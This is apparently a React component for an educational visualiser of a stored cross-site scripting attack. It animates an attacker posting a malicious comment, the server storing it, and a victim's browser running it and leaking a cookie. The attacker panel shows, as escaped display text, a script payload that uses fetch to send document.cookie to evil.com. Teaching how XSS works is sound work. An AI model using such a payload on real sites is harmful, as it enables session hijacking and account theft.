
import React from 'react';
import { AnimationStep } from '../types';
import { Laptop, Server, Database, Globe, User, MessageSquare, Cookie, ArrowRight, ShieldAlert } from 'lucide-react';

interface XssVisualizerProps {
  step: AnimationStep;
}

export const XssVisualizer: React.FC<XssVisualizerProps> = ({ step }) => {
  const currentState = step.xssStep || 'inject';
  
  // Animation triggers
  const showInject = currentState === 'inject';
  const showStore = ['store', 'victim_load', 'execute', 'exfiltrate'].includes(currentState);
  const showVictim = ['victim_load', 'execute', 'exfiltrate'].includes(currentState);
  const showExecute = ['execute', 'exfiltrate'].includes(currentState);
  const showExfil = currentState === 'exfiltrate';

  return (
    <div className="flex flex-col gap-8 w-full max-w-6xl mx-auto p-4">
        
        {/* ACTORS ROW */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8 items-start">
            
            {/* 1. ATTACKER */}
            <div className="flex flex-col gap-4">
                <div className="flex items-center gap-2 text-red-400 font-bold uppercase tracking-wider text-sm">
                    <Laptop size={18} /> Attacker
                </div>
                <div className={`p-4 rounded-xl border-2 transition-all duration-500 flex flex-col gap-4
                    ${showInject ? 'border-red-500 bg-red-900/10 shadow-lg' : 'border-slate-700 bg-slate-900'}
                `}>
                    <div className="bg-white rounded p-2 shadow-inner">
                        <div className="text-[10px] text-slate-500 font-bold mb-1">Post Comment</div>
                        <div className="bg-slate-100 p-2 rounded text-xs font-mono text-slate-800 break-all border border-slate-300">
                            &lt;script&gt;<br/>
                            fetch('http://evil.com?c='+document.cookie)<br/>
                            &lt;/script&gt;
                        </div>
                        <button className="mt-2 w-full bg-blue-500 text-white text-xs py-1 rounded font-bold shadow-sm">
                            Submit
                        </button>
                    </div>
                    {showExfil && (
                        <div className="bg-black p-2 rounded border border-green-500 text-green-400 text-xs font-mono animate-bounce">
                            [LOG] GET /?c=SESSION_ID=ABC...
                        </div>
                    )}
                </div>
            </div>

            {/* 2. SERVER & DB */}
            <div className="flex flex-col gap-4">
                <div className="flex items-center gap-2 text-blue-400 font-bold uppercase tracking-wider text-sm">
                    <Server size={18} /> Web Server & DB
                </div>
                <div className={`p-4 rounded-xl border-2 transition-all duration-500 flex flex-col items-center gap-4 relative min-h-[200px]
                    ${showStore ? 'border-blue-500 bg-blue-900/10' : 'border-slate-700 bg-slate-900'}
                `}>
                    {/* Database Visual */}
                    <div className="relative">
                        <Database size={64} className="text-slate-600" />
                        {showStore && (
                            <div className="absolute inset-0 flex items-center justify-center">
                                <div className="w-3 h-3 bg-red-500 rounded-full animate-ping"></div>
                            </div>
                        )}
                    </div>
                    
                    <div className="bg-[#1e1e1e] w-full p-2 rounded border border-slate-600 text-[10px] font-mono text-slate-400">
                        <div>Table: Comments</div>
                        <div className="h-px bg-slate-700 my-1"></div>
                        <div className="flex flex-col gap-1">
                            <div className="flex justify-between"><span>1. Alice</span> <span>Hello!</span></div>
                            <div className="flex justify-between"><span>2. Bob</span> <span>Nice post.</span></div>
                            {showStore && (
                                <div className="flex justify-between text-red-400 animate-in slide-in-from-top-2">
                                    <span>3. Evil</span> 
                                    <span className="truncate w-16">&lt;script&gt;...</span>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            </div>

            {/* 3. VICTIM */}
            <div className="flex flex-col gap-4">
                <div className="flex items-center gap-2 text-green-400 font-bold uppercase tracking-wider text-sm">
                    <User size={18} /> Victim
                </div>
                <div className={`p-4 rounded-xl border-2 transition-all duration-500 flex flex-col gap-4 relative
                    ${showVictim ? 'border-green-500 bg-green-900/10' : 'border-slate-700 bg-slate-900 opacity-50'}
                `}>
                    {/* Browser UI */}
                    <div className="bg-slate-200 rounded-lg overflow-hidden shadow-lg min-h-[150px] flex flex-col">
                        <div className="bg-slate-300 p-2 flex items-center gap-2 border-b border-slate-400">
                            <Globe size={12} className="text-slate-600"/>
                            <div className="h-2 w-32 bg-white rounded-full"></div>
                        </div>
                        <div className="p-3 font-sans text-xs text-slate-800 flex-1 relative">
                            <h3 className="font-bold mb-2">Comments Section</h3>
                            <div className="space-y-2">
                                <div className="flex gap-2"><div className="w-4 h-4 bg-blue-300 rounded-full"></div> Hello!</div>
                                <div className="flex gap-2"><div className="w-4 h-4 bg-purple-300 rounded-full"></div> Nice post.</div>
                                {showVictim && (
                                    <div className="p-1 bg-red-100 border border-red-300 rounded text-[8px] text-red-800 font-mono opacity-80">
                                        &lt;script&gt;fetch(...)&lt;/script&gt;
                                    </div>
                                )}
                            </div>

                            {/* Execution Overlay */}
                            {showExecute && (
                                <div className="absolute inset-0 bg-black/80 flex items-center justify-center backdrop-blur-sm animate-in fade-in">
                                    <div className="text-center">
                                        <ShieldAlert size={32} className="text-red-500 mx-auto mb-1" />
                                        <div className="text-white font-bold">Script Executing...</div>
                                        <div className="text-green-400 font-mono mt-1 flex items-center gap-1 justify-center">
                                            <Cookie size={10} /> Reading Cookie
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            </div>

        </div>

        {/* FLOW ARROWS / PATHS */}
        <div className="relative h-12 hidden md:block">
             {/* Inject Path */}
             <div className={`absolute left-[16%] top-0 transition-all duration-700 ${showInject && !showStore ? 'opacity-100 translate-y-2' : 'opacity-0'}`}>
                 <ArrowRight size={24} className="text-red-500 rotate-90" />
             </div>
             
             {/* Load Path */}
             <div className={`absolute right-[33%] -top-4 w-1/3 h-4 border-t-2 border-dashed border-slate-600 rounded-t-full transition-all duration-500 ${showVictim ? 'opacity-100' : 'opacity-0'}`}></div>
             
             {/* Exfil Path */}
             <div className={`absolute top-2 w-full flex items-center justify-center transition-all duration-1000 ${showExfil ? 'opacity-100' : 'opacity-0'}`}>
                 <div className="w-full border-t-2 border-red-500/50 border-dashed absolute top-2"></div>
                 <div className="bg-red-900 text-red-200 text-xs px-3 py-1 rounded-full relative z-10 flex items-center gap-2 shadow-lg border border-red-500 animate-slide-left">
                     <Cookie size={12} /> Stolen Cookie
                 </div>
             </div>
        </div>

    </div>
  );
};
